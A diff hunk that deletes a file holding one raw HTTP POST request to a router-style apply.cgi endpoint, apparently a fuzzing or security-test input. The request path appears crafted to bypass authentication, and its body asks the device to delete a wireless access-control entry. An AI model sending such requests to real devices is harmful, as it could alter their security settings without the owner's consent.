@@ -1,6 +1,0 @@
-POST /apply.cgi?/USB_browse.htm?openfile=USB_Folder_creat.htm HTTP/1.1
-Host: 5
-Content-Type: application/json
-Content-Length: 44
-
-submit_flag=wlacl_del&%20timestamp=wzqwzqwzq
